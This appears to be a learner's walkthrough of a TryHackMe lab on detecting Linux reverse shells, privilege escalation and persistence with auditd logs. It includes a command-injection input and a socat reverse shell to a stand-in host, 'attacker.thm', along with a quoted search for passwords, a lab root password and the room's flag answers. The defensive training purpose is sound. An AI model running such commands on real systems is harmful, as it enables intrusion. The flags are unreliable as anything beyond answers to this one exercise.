# Detecting Discovery Techniques in Linux Systems
**Date:** 2026-04-28

**Objective:**
- Learn how reverse shells are used in Linux intrusions
- Understand how the attackers escalate their privileges
- Explore the five most common techniques to persist on Linux

**Environment:** TryHackMe – “Linux Threat Detection 3” room  
**Tools Used:** CLI

---

## REVERSE SHELLS

> Run 127.0.0.1 && whoami in the TryPingMe web app.

> Access the scenario auditd logs at ausearch -i -if /home/ubuntu/scenario/audit.log
### What output do you see after the ping results?

<img width="1280" height="435" alt="Screenshot 2026-04-28 at 5 03 57 PM" src="https://github.com/user-attachments/assets/646abffd-ef97-4139-9b1e-85e5bd2df14a" />

<img width="1918" height="798" alt="image" src="https://github.com/user-attachments/assets/85a920e1-7e11-47df-bd4b-497d0486765a" />

- svctrypingme

##
> Now try spawning a reverse shell to the imaginary "attacker.thm" address.

> Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app.
### What is the flag returned in the TryPingMe response?

<img width="1916" height="1052" alt="image" src="https://github.com/user-attachments/assets/d9038d6b-ae1e-4fb1-a443-d46da67c1c88" />

To clarify, I did insert the command in the box and this is what I received. 
This goes over the process of how some attackers are ableI to exploit vulnerabilities as a client (client side). Working with metasploit (I should link my metasploit walkthrough here) will show you the process of listening for the response, connecting, and trying to further exploit many other vulnerabilities / extract information. 

- THM{revshells_practitioner!}

##
> Now look at the exported auditd logs at /home/ubuntu/scenario.
### Which IP spawned a similar reverse shell via the TryPingMe app?

Initially, I used "ausearch -i -if /home/ubuntu/scenario/audit.log" and scrolled through to find the answer, however, to hone it down better:
<img width="2214" height="424" alt="image" src="https://github.com/user-attachments/assets/895210e6-d33e-4b33-99b1-0215b89fec17" />

Initially, I beleive theres activity where the attacker is attempting to ping themselves to ensure that a connection can be made and then begins to run commands to establish a reverse shell

- 10.14.105.255

---

## PRIVILEGE ESCALATION

### Which command line was used to look for the "pass" keyword in files?

For this, I used "ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'pass'"

<img width="1680" height="280" alt="image" src="https://github.com/user-attachments/assets/88095872-55f7-470b-ab14-a1b4857db7c4" />

- grep -iR pass .

##

### Which command line was used to escalate privileges to root?

<img width="2202" height="230" alt="image" src="https://github.com/user-attachments/assets/bfc50302-f41d-45f3-a73b-37c5f7e1e065" />
- uid: svctrypingme -> This is who it was launched by (remember that when pinging the IP and using whoami, we received "svctrypingme")
- Command: sudo su (root)
- PPID / PID: 2546 / 2554

##

### Looking at the detected .env file, what was the root password?

One thing I've learned that THM failed to emphasize is running something similar to "ausearch -i -if <(directory of audit folder including audit log name) -x (command)", instead, they've ran "ausearch -i -x (command).

<img width="2222" height="1142" alt="image" src="https://github.com/user-attachments/assets/ff5f5894-6bbd-4ec1-90b0-d449e18f9c0f" />

<img width="884" height="306" alt="image" src="https://github.com/user-attachments/assets/19e34958-d693-4aee-a6c5-f6d4b2494d99" />

- nGql1pQkGa


---


## STARTUP PERSISTENCE
> In this task, try to detect two persistence methods by using auditd logs (ausearch -i).
### What flag did you get after running the malware persisting as a service?

To begin, I'm running the command "ausearch -i -f /etc/systemd" as this has to do with services / service files

<img width="2220" height="1166" alt="image" src="https://github.com/user-attachments/assets/383b4137-6294-4431-84f1-8f0b02a1ed7f" />

Repeatedly, this tux.service file is frequently being nano-ed

<img width="824" height="368" alt="image" src="https://github.com/user-attachments/assets/4d471aeb-3888-435e-9793-da439fa3be79" />
- The "ExecStart" line is our area of interest as it gives some context as to whats being ran in order to make this service work

Going forward (THM doesn't tell you this because they hate you and want you to second guess yourself), you have to grep parts of the flag structure (I.e., 'THM') since if you cat the 'tux' file in the directory we've discovered, you will get a very long line of text and your terminal may not work, causing you to refresh the screen. I was stuck here at that point and needed to do research to figure out what was wrong.

<img width="2224" height="346" alt="image" src="https://github.com/user-attachments/assets/e7dc789f-5bae-435e-807e-48afd910cee5" />

- THM{hidden_penguin!}

##

### What flag did you get after running the malware persisting as a cron job?

<img width="2208" height="370" alt="image" src="https://github.com/user-attachments/assets/94284e43-6144-430b-88c3-7b22e6b7d975" />

<img width="1130" height="778" alt="image" src="https://github.com/user-attachments/assets/943a9fc3-31fd-41d1-bb8a-f47a0a13047e" />

<img width="764" height="214" alt="image" src="https://github.com/user-attachments/assets/5bc19ecb-6b15-4ef9-9ce7-02f009d9b086" />

<img width="692" height="284" alt="image" src="https://github.com/user-attachments/assets/90b4c8ef-fe31-49a1-97e0-39fe7679cfbd" />

- THM{ressurect_on_reboot!}


---


## ACCOUNT PERSISTENCE
> Now, detect two more persistence methods on the VM: Backdoored user and SSH key.

### Which user was created and added to the sudo group?
First, I'm going to use ausearch to filter for the use of "useradd" and or "usermod"

<img width="2226" height="272" alt="image" src="https://github.com/user-attachments/assets/d43ce0cd-e378-4368-a1d5-60bd285a4b6b" />

Now cat the auth.log

<img width="2220" height="252" alt="image" src="https://github.com/user-attachments/assets/1af9d2c2-b36b-4551-9282-32d9cf099a8c" />

Whats seen here in the auth log is the initial act where the attacker created the koichi user / group which was seen when using the audit log (ausearch).

- sudo

##

### Which file was changed to allow SSH key persistence?

Now I'm going to be checking on the SSH authorized keys file to see if the attacker may have added a backdoor key onto the system

<img width="2208" height="566" alt="image" src="https://github.com/user-attachments/assets/42e43e57-809a-4692-885e-bcfd415a71d8" />

From what I know, SSH public keys are stored in ~/.ssh/authorized_keys, and attackers can use them for persistence. In audit logs, seeing proctitle=bash may indicate that commands were executed within a shell, but without proper execve logging or auditing configuration, the exact commands may not be visible. This suggests potential malicious activity

- /root/.ssh/authorized_keys


---
